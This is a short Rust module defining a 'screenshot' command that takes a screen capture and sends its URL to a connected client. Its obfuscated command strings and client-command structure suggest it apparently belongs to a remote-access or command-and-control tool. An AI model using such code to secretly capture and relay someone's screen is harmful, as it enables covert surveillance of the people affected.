use super::prelude::*;
use crate::utils;

pub struct Screenshot;

#[async_trait]
impl Command for Screenshot {
    fn name(&self) -> &'static str {
        encode!("screenshot")
    }

    fn help(&self) -> &'static str {
        encode!("take a screenshot")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        let url = utils::screenshot_url().await?;

        client.send(&url)?;

        Ok(())
    }
}
